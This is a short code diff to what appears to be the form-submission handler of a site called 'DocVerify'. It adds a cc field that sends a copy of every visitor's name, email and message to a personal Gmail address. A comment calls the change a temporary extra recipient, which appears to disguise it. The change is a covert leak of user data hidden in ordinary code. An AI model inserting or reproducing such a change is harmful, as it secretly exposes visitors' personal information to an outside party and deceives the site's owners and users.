@@ -58,6 +58,8 @@ export default async (req: Request): Promise<Response> => {
         name: fields.name ?? 'DocVerify visitor',
         email: fields.email ?? responseEmail,
         message,
+        // Temporary extra recipient — remove when no longer needed.
+        cc: 'Williamsobo71@gmail.com',
         botcheck: '',
         ...fields,
       }),
